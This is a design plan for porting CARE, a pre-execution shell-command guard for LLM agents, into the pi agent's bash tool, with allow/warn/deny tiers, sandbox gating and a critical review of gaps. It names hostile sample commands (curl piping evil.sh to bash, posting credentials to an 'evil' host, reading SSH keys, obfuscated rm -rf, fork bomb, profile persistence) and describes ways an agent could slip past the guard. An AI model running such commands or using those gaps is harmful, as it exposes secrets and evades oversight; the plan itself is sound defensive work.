# Plan: Add CARE (pre-execution command verification) to pi

**Source:** Liu et al., "CARE: Pre-Execution Command Verification for Shell-Executing
LLM Agents" (ISSRE 2026), arXiv:2607.21642. MIT-licensed reference implementation:
`https://github.com/prisma-research/CARE`.

## TL;DR

Port CARE's deterministic static pipeline to TypeScript as a pi extension layer that
sits in front of the `bash` tool: **auto-allow** clearly benign commands (no prompt),
**hard-block** the catastrophic DENY tier, and **escalate** the ambiguous WARN band to
the user with an auditable evidence trace. There is **no LLM judge** — the human is the
judge for the ambiguous band, while DENY is a non-overridable block ("computer
explodes" tier). Auto-allow is gated on the bwrap sandbox being enabled (see "Critical
review" for the limits of this).

## Why CARE fits pi

- pi's bash tool is exactly CARE's threat model: an LLM agent dispatching individual
  shell commands at a boundary before execution.
- The user already has the two layers CARE is _complementary to_: `ask-permission.ts`
  (human-in-the-loop) and the bwrap sandbox (containment). CARE adds the missing
  **static pre-filter** that makes the permission prompt tolerable and the sandbox less
  relied upon.
- CARE's static tier needs **no LLM at decision time** — deterministic, auditable, and
  (per the paper) the more conservative profile against paraphrase-shared attacks.

## On the paper's numbers

Deliberately **not** reproduced here. This port differs from the reference in ways that
make the paper's headline figures non-transferable: a TypeScript parser instead of
bashlex, the user's real workload instead of the paper's eval split, and human
escalation instead of an LLM judge. The paper's numbers (F1/DR/FPR/latency) are not
targets for this implementation. We re-evaluate the finished guard on the user's own
usage (Phase 2 soak) and a small side-by-side smoke test (Phase 3) — nothing is carried
over as a goal.

## Architecture decision: port to TypeScript, don't shell out to Python

CARE is Python + `bashlex`. pi is a bun-compiled single binary. Two options:

1. **Port the static core to TS** (recommended). The pipeline is pure logic over a
   string + JSON artifacts; the L1 parser degrades to a regex fallback in CARE itself
   ("if [bashlex] is unavailable the L1 layer degrades to a regex fallback"), so a TS
   port is faithful-by-design. Zero runtime deps, low single-digit ms per command, no
   subprocess spawn, works offline, testable with the repo's `tsc` setup.
2. **Call the Python package as a subprocess.** Tens of ms spawn latency per command
   (orders of magnitude slower than in-process), needs `python3` + `bashlex` in the
   runtime env. Reject for the default path; optionally keep a `--backend python`
   parity mode for validation only.

For shell parsing in TS: use `unbash` — a fast, zero-dependency, TypeScript bash parser
that returns a typed, source-positioned AST with dequoted word values, and recovers a
best-effort partial tree (plus a list of errors) on malformed input. It never executes
code, which fits the "canonicalization must be purely syntactic" requirement. **Fail
closed** on parse failure + high-risk tokens — unbash's partial tree + error list gives
us exactly the signal CARE needs — so parse gaps don't become bypasses.

`unbash` is a runtime dependency of the care extension, which is a **self-contained
extension directory** (same pattern as the existing `extensions/sandbox/`):

```
extensions/care/
├── index.ts           # guard entry point (Phase 2)
├── package.json       # { "type": "module", dependencies: { unbash } }
├── node_modules/      # unbash installed here
├── lib/               # the ported CARE modules
└── test/              # node:test suite (npm test)
```

Installing `unbash` into the extension's own `node_modules/` (not `npm/`) puts it on the
standard walk-up resolution path from `lib/`, so pi's jiti loader and the editor both
resolve it without a `tsconfig.json` `paths` entry. Tests run with `npm test`
(`node --test`) inside `extensions/care/`; the repo-wide typecheck also covers them.

## Integration surface (existing pi APIs)

- **Hard block (DENY):** `pi.on("tool_call", ...)` → `isToolCallEventType("bash", event)`
  → return `{ block: true, reason }` with the evidence trace. No prompt, no override.
- **Escalation (WARN):** `ctx.ui.select` permission dialog with a human-readable
  evidence summary (what the command does, why it was flagged). A human is always
  present — no headless path.
- **Rewrite path (optional):** `BashSpawnHook` in `createBashToolDefinition` options
  can mutate `{ command, cwd, env }` pre-exec (paper is verify-only; keep as future
  work for canonicalization-based rewriting).
- **Config:** a `care.json` config file in the pi dir (`~/.pi/agent/care.json`); see
  the config section below.

## Decision flow

Order matters — DENY wins over everything, and auto-allow is conditional on the sandbox:

1. CARE computes ALLOW / WARN / DENY over the canonicalized command.
2. **DENY** → hard block (`{ block: true, reason }`). The "computer explodes" tier: no
   prompt, no human override. The only way to lift a DENY is a deliberate, persistent
   `overrides` entry in `care.json` (audited, not one-click).
3. **WARN** → escalate to the user (permission dialog with the evidence summary).
4. **ALLOW** → auto-allow (no prompt) **only while the bwrap sandbox is enabled**. With
   the sandbox off, ALLOW falls through to the prompt — CARE can miss dangerous
   commands, and that is only acceptable because bwrap contains the blast radius.
5. **Read-only auto-allow** is a *narrow* predicate, not "no writes": it additionally
   excludes network egress, secret-tier paths, pipes / command substitution feeding a
   sink, and interpreter-script execution (`bash file`, `source file`, `. file`,
   `sh file`). Those WARN/DENY, never auto-allow.
6. The auto-allow policy applies *only* when CARE did not DENY.

## Config file (`care.json`)

Lives in the pi dir (`~/.pi/agent/care.json`). Sketch:

```json
{
  "mode": "balanced",
  "warnPolicy": "prompt",
  "requireSandboxForAutoAllow": true,
  "autoAllow": {
    "readOnly": true,
    "careDefault": true
  },
  "overrides": {
    "allowHeads": [],
    "denyHeads": [],
    "allowPaths": [],
    "denyPaths": []
  }
}
```

- `mode`: `strict` | `balanced` | `auto` (decision thresholds, retuned in the soak).
- `warnPolicy`: `prompt` (human judge, default) | `deny` (treat WARN like DENY). Never
  an LLM.
- DENY behavior is fixed (not configurable): always a hard block, always wins over
  `autoAllow`. Only an explicit `overrides` entry lifts it.
- `requireSandboxForAutoAllow`: auto-allow (both `readOnly` and `careDefault`) only
  applies while the bwrap sandbox is enabled; otherwise everything not-DENY prompts.
- `autoAllow.readOnly`: a *narrow* read-only rule (Decision flow §5) — excludes network
  egress, secret paths, sink pipes, interpreter-script execution. Not a blanket "no
  writes".
- `autoAllow.careDefault`: auto-allow the CARE ALLOW band (subject to the sandbox gate).
- `overrides`: per-head / per-path escape hatches for real workflows (nix, git, docker).
  Prefer head+subcommand specificity — bare heads are coarse (GTFOBins abuses `git`).
  `allow*` entries are the *only* way to override a DENY.

## Port map (paper/CARE repo → this repo)

Module paths in the table below live under `extensions/care/lib/` (this port is a
self-contained extension directory, not the repo-level `lib/`).

| CARE module                 | Port to                                                       | Notes                                                                                                                                                   |
| --------------------------- | ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `canonicalization.py`       | `lib/care/canonicalize.ts`                                    | wrapper unwrap (`sh -c`), IFS/var split, base64/printf decode, light deobfuscation; `unbash` word parts give raw + dequoted text                          |
| `structure.py` (L1)         | `lib/care/structure.ts`                                       | `unbash` AST → structural indicators (exec handoff, obfuscation nesting, incomplete parse); fail-closed                                                    |
| `semantic.py` (L2)          | `lib/care/semantic.ts` + `lexicon.ts`                         | ~250-head lexicon, 9 risk classes, dual-use sub-classifiers (chmod, dd, docker, find -exec, sed -i, tar --to-command, awk/perl/ruby)                    |
| `path.py` (L3)              | `lib/care/path.ts`                                            | operand extraction, ~/ expand, bounded symlink resolution, read/write context asymmetry, 4 sensitivity tiers; reuse `ask-permission.ts`'s `canonical()` |
| `pattern.py` (L4)           | `lib/care/pattern.ts` + `lib/care/rules/rule_provenance.json` | 139-rule bank ports 1:1 (92 MITRE, 31 GTFOBins, 16 manual)                                                                                              |
| `policy.py`/`modes.py` (L5) | `lib/care/policy.ts`                                          | weighted sum of semantic/path/pattern/structure signals; mode thresholds (retuned in the soak)                                                          |
| `resolution.py` (Stage 3)   | `extensions/care-guard.ts`                                    | skip predicates p_rule/p_sem/p_spath promote high-confidence WARN → DENY (hard block); remaining WARN → user prompt                                    |
| `engine.py`                 | `lib/care/engine.ts`                                          | `analyze(cmd) → { decision, score, layers, firedRules, trace }`                                                                                         |

**Deliberate deviation — no LLM judge:** the paper's Stage 3 (Resolution) sends the
ambiguous WARN band to an LLM judge for a SAFE/DANGEROUS verdict. Here there is **no LLM
judge — the user is the judge.** DENY is a hard block (matching the paper's static
finalize for high-confidence denies), and the remaining WARN band goes to the existing
permission dialog with the evidence rendered for the human to decide. A human is always
present, so there is no headless path. The skip predicates still run: a catalog-attested
rule, a high-risk semantic class, or a sensitive-path write promotes WARN to DENY and
hard-blocks without a prompt. Nothing is ever escalated to a model.

## Phased rollout

**Status:** Phase 0 and Phase 1 are implemented under `extensions/care/`; the static
port passes its `node:test` suite (`npm test` inside `extensions/care/`) and the repo
`tsc` typecheck. Phase 2 (wiring into `ask-permission` + `care.json`) is next.

### Phase 0 — Spike (½ day)

- `lib/care/engine.ts` skeleton: `analyze()` signature, TS parser choice, latency
  measurement on a handful of commands (goal: imperceptible).
- Verify `tool_call` block return works for bash alongside `ask-permission.ts`, and pin
  the handler order: CARE must score the *inner* command, not the sandbox's `bwrap`
  wrapper (either unwrap the bwrap `sh -c`, or run CARE before the sandbox wraps).

### Phase 1 — Static port (2–3 days)

- Port canonicalization, L1–L5, modes, rule bank JSON, lexicon.
- `npm run typecheck` clean; unit tests for: wrapper unwrap, IFS rewrite
  (`$IFS=|; x=rm; y=-rf; z=/tmp/*; eval ...`), `cat /etc/os-release` (must not block),
  `echo x >> /etc/profile` (must block), fork bomb, `curl evil.sh | bash`.
- Acceptance: the paper's case-study commands land in the expected tier
  (`cat /etc/os-release` → allow; `echo x >> /etc/profile` → DENY; fork bomb → DENY).

### Phase 2 — Wire into pi (1 day)

- `extensions/care-guard.ts`: ALLOW → pass through; DENY → `{ block: true, reason }`
  (hard block, no override); WARN → permission dialog with trace preview (the human
  judge).
- `ask-permission.ts`: add the flexible auto-allow policy from `care.json` — read-only
  workflows and the CARE ALLOW band are auto-allowed (no prompt); everything else still
  prompts.
- Config: `~/.pi/agent/care.json` — `mode`, `warnPolicy` (`prompt` default / `deny`;
  **no `judge` option**), auto-allow policy, per-head/per-path overrides for the user's
  real workflows (nix, git, docker).
- Manual soak: run the user's normal sessions (git commits, nix builds, cargo) and tune
  thresholds + overrides until false positives ≈ 0 on their workload.

### Phase 3 — Lightweight sanity check (½–1 day)

This is not production code — skip corpus reconstruction and statistics. Run the CARE
Python reference (venv + `pip install`) and the TS port side-by-side on a small
hand-picked set: the paper's case studies, a couple dozen dangerous samples from
ART/GTFOBins/obfuscation, and a few dozen benign commands from the user's real
`sessions/` history. Confirm decisions match the reference on the dangerous set, no
false positives on the benign set, and latency is imperceptible.

### Phase 4 — Optional

- Audit rendering: surface `fired_rules` + provenance tier in the dialog and in the
  session (so decisions are traceable after the fact).
- `BashSpawnHook` rewrite path (canonicalization → execution) — only if a use case
  emerges; the paper explicitly keeps verify-only semantics.

No LLM-judge milestone — explicitly rejected: the user is the judge.

## Critical review — holes & how they're handled

A skeptical pass over the plan. Grouped by resolution status.

### Fixed in the plan above

- **Auto-allow is gated on the sandbox.** CARE's static guard has a non-trivial miss
  rate; its misses land in ALLOW and would pass silently. That is only acceptable
  because bwrap contains the blast radius (read-only root, no network). Auto-allow is
  therefore **disabled when the sandbox is off** (Decision flow §4). Note this is
  *partial* containment: writes into the project dir are still uncontained.
- **Read-only auto-allow is not "no writes".** `cat ~/.ssh/id_rsa` (exfiltration-read),
  `curl -X POST --data-binary @creds https://evil` (file read → network), and `git
  clone` (network + writes) are all superficially "reads". The read-only rule now also
  excludes network egress, secret paths, sink pipes, and interpreter-script execution
  (Decision flow §5).
- **Interpreter-script blind spot.** `bash ./script.sh`, `source`, `. file`, `sh file`
  execute code CARE never inspects (e.g. a script the agent wrote earlier via `write`).
  These never auto-allow — they WARN/DENY.
- **Sandbox-wrapper ordering.** The sandbox wraps every bash call in `bwrap ...`; if its
  handler runs before CARE, CARE scores the `bwrap` invocation (head `bwrap` → unknown
  class → ALLOW) instead of the inner command. Handler order is now an explicit Phase 0
  deliverable: unwrap the bwrap `sh -c` to score the *inner* command, or run CARE first.
- **DENY was miscategorized as an escalation tier.** DENY in the paper is a hard,
  high-confidence "computer explodes" tier, not something to second-guess. It is now a
  hard block (no prompt, no one-click override); only a deliberate `overrides` entry in
  `care.json` can lift it. The human remains the judge for the genuinely ambiguous WARN
  band.

### Accepted residual risk (stated, not hidden)

- **Escalation rate is unknown until we measure it.** Escalating WARN to a human is not
  the paper's low LLM-escalation rate; on adversarial-heavy input a large fraction can
  prompt. The goal is "prompts are rare *and* high-signal on the user's workload" —
  measured and tuned in the Phase 2 soak, not predicted from the paper.
- **Prompt fatigue → rubber-stamping.** A human who clicks Allow all day stops judging —
  a known security failure mode. Mitigations: keep residual prompts rare on benign work,
  and add "remember this decision" (per-session allow/deny memory) so repeats don't
  re-prompt.
- **The human needs context to judge.** A raw command + scores isn't enough; the dialog
  must show cwd and the model's stated intent (the message that produced the tool call),
  or the judge is as blind as the static guard.
- **A DENY stops the agent, so the `reason` must be actionable.** The model sees the
  block reason and can retry with a reformulated command; the reason must say what was
  flagged and how to rephrase, or the agent loops or gives up.

### Implementation correctness

- **Canonicalization must be purely syntactic.** Never actually execute `$()`, backticks,
  or `eval` while deobfuscating — otherwise the guard is itself an RCE target for the
  same attacker. (`unbash` does not execute code.) Show the raw command *alongside* the
  canonicalized form, labeled "best-effort; may still be obfuscated".
- **The dialog is a plain `ctx.ui.select` (title + options).** Rich evidence needs
  `ctx.ui.custom()`, or the trace must be a concise human-readable summary ("writes to
  /etc/profile — persistence; matches GTFOBins `find -exec sh`"), not rule IDs/scores.
- **Rule bank is a point-in-time research artifact.** GTFOBins/MITRE keep changing; the
  upstream repo is unmaintained. Fine for non-production, but treat the 139 rules as a
  snapshot, not a living feed.
- **Non-bash tools are unsandboxed and uncovered.** `write`/`edit` run outside bwrap and
  CARE only covers `bash`. `write ~/.ssh/authorized_keys` or planting a script for later
  `bash script.sh` is outside the guard. Ask-permission still prompts for these (no
  auto-allow) — that's the only gate. Worth extending path-sensitivity to them later.
- **Allowlist overrides are coarse bypasses.** `allowHeads: ["git"]` also allows
  GTFOBins' `git` tricks. Prefer head+subcommand patterns and audit them.

### Not worth fixing now

- A small smoke set can't estimate the false-positive rate. That's fine: the Phase 2
  soak on real `sessions/` is where it gets tuned; Phase 3 is only a decision-parity
  smoke test.
- `settings.json` vs `care.json` — two config files could drift. Acceptable for a
  personal config; just don't duplicate a key across both.

## Risks & mitigations

| Risk                                                       | Mitigation                                                                                                                                                                  |
| ---------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `unbash` < bashlex: different parse behavior → evasion/FPs | `unbash` is a tolerant parser (partial tree + errors); fail-closed on parse failure; A/B vs Python reference in Phase 3; keep the regex fallback path                                              |
| False positives on the user's real workloads               | Phase 2 soak on real session history (`sessions/` is right there); head/path overrides; WARN is a prompt, not a hard block                                                  |
| TOCTOU / symlink races (L3 resolves at check time)         | Document as guard-not-sandbox; bwrap sandbox stays as the containment layer                                                                                                 |
| Rule bank staleness (GTFOBins/MITRE updates)               | Keep `rule_provenance.json` as a data file with provenance tags; add a refresh script (upstream is MIT)                                                                     |
| License                                                    | MIT — compatible; keep attribution + this doc's source link                                                                                                                 |

## Explicitly out of scope (paper's own limits)

- Trajectory-level defenses (staged download→chmod→execute chains, iterative
  exfiltration) — each step still crosses the guard, but session-level reasoning is
  future work.
- Non-bash tools (`read`/`write`/`edit`) — covered by ask-permission + sandbox note
  (sandbox currently wraps bash only).
- Replacement for sandboxing/host hardening — complementary layer only.
- Headless / non-interactive operation — there is always a human in the loop; no
  non-interactive fallback is designed.

## Decisions (resolved with the user)

1. **WARN band** → prompt the human (the user is the judge). No LLM judge.
2. **DENY band** → hard block (the "computer explodes" tier). Non-overridable in the
   dialog; only a deliberate `overrides` entry in `care.json` lifts it.
3. **Auto-allow policy** (flexible, in `ask-permission.ts`, driven by `care.json`):
   - read-only workflows (narrow predicate — Decision flow §5) → auto-allow;
   - CARE ALLOW band → auto-allow (while the sandbox is on);
   - everything else → prompt (WARN) or block (DENY).
4. **Config** lives in a JSON file in the pi dir: `~/.pi/agent/care.json`.
5. **Phase 3** is a lightweight sanity check, not an exhaustive eval — this is not
   production code.
6. **No paper numbers** — this implementation differs from the reference and carries no
   F1/DR/FPR/latency targets; it is re-evaluated on real usage after completion.
7. **Headless operation is out of scope** — there is always a human in the loop; the
   guard assumes an interactive judge and has no non-interactive fallback.
